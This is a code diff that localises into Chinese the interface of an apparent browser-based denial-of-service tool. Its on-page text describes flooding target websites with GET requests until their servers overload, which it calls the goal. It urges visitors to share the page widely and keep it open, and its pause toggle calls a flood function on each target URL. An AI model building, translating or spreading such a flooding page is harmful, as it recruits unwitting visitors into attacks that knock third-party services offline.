@@ -80,11 +80,10 @@
         <div class="modal-dialog modal-dialog-centered" role="document">
           <div class="modal-content">
             <div class="modal-header">
-              <h5 class="modal-title" id="exampleModalLabel">Warning!</h5>
+              <h5 class="modal-title" id="exampleModalLabel">提醒</h5>
             </div>
             <div class="modal-body">
               <p>分享给多个人效果更佳</p>
-              <hr>
               <p>请保持网页开启</p>
             </div>
             <div class="modal-footer">
@@ -115,7 +114,7 @@
 
     <div class="desc text-center">
     <h3>攻击状态</h3>
-    <p>每个目标网站的 GET 请求和错误响应的数量如下所示。 错误是正常的 这意味着他们的服务器超载并丢弃数据包 - 这就是目标！</p>
+    <p>每个目标网站的 GET 请求和错误响应的数量如下所示 错误是正常的 这意味着他们的服务器超载并丢弃数据包 - 这就是目标！</p>
     <p>请求总数: <span id="totalrequests">0</span></p>
     <p>错误总数: <span id="totalerrors">0</span></p>
     <button type="button" class="btn btn-primary" onclick="togglePause();">Resume</button>
@@ -145,10 +144,10 @@
         function togglePause () {
             if (attack) {
                 attack = false;
-                document.querySelector("div.desc .btn").innerText = "Resume";
+                document.querySelector("div.desc .btn").innerText = "恢复";
             } else {
                 attack = true;
-                document.querySelector("div.desc .btn").innerText = "Pause";
+                document.querySelector("div.desc .btn").innerText = "暂停";
                 for (var i=0; i<urls.length; i++) {
                     flood(i);
                 }
